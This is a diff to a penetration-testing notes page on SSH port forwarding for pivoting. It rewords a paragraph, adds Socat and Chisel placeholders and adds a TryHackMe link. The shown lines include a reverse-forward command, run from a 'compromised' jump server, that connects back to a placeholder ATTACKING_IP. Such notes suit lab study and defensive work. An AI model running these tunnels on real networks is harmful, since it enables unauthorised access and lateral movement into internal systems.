@@ -28,8 +28,7 @@ veresk@kali$ ssh -L *:80:intra.example.com:80 user@jump-server.net -fN
 {% tab title="SSH Remote-Forwarding" %}
 **Remote port forwarding** allows a client machine of an SSH connection to redirect one of its ports to a port on the server, or to redirect a port of a network machine from the SSH server to a port local to the server.  
   
-We can,for example, on a compromised computer (jump-server) connect back to the attackbox with a reverse port forward using the following command.  
-This example produce the same result as previously seen with Local-Forwarding. Any connection on `ATTACKING_IP:8000` will be redirected on `intra.example.com:80`
+On a compromised computer (jump-server), we can connect back to the attackbox with a reverse port forward using the following command, this example produce the same result as previously seen with Local-Forwarding. Any connection on `ATTACKING_IP:8000` will be redirected on `intra.example.com:80`
 
 ```bash
 PC> ssh -R 8000:intra.example.com:80 tunneluser@ATTACKING_IP -fN
@@ -45,6 +44,7 @@ ssh -R 9090 tunneluser@ATTACKING_IP -fN
 ### SOCAT
 {% tabs %}
 {% tab title="Socat" %}
+WORK_IN_PROGRESS
 {% endtab %}
 {% endtabs %}
 
@@ -52,6 +52,7 @@ ssh -R 9090 tunneluser@ATTACKING_IP -fN
 ### CHISEL
 {% tabs %}
 {% tab title="Chisel" %}
+WORK_IN_PROGRESS
 {% endtab %}
 {% endtabs %}
 
@@ -59,5 +60,7 @@ ssh -R 9090 tunneluser@ATTACKING_IP -fN
 
 {% embed url="https://attack.mitre.org/techniques/T1572/" %}
 {% embed url="https://podalirius.net/en/articles/ssh-port-forwarding/" %}
+{% embed url="https://tryhackme.com/room/wreath"%}
+
 
 
